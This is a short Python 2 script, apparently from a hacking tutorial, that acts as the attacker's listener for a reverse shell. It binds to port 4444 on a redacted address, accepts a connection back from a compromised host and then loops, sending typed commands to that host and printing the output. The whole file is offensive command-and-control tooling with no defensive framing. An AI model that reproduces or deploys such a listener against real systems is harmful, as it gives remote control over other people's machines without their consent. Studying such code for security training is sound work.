#!/usr/bin/ env python
import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(("xx.x.x.xx", 4444))
listener.listen(0)
print("[+] Waiting for connection")
connection, address = listener.accept()
print("[+] Got a connection")

while True:
    command = raw_input(">> ")
    connection.send(command)
    result = connection.recv(1024)
    print(result)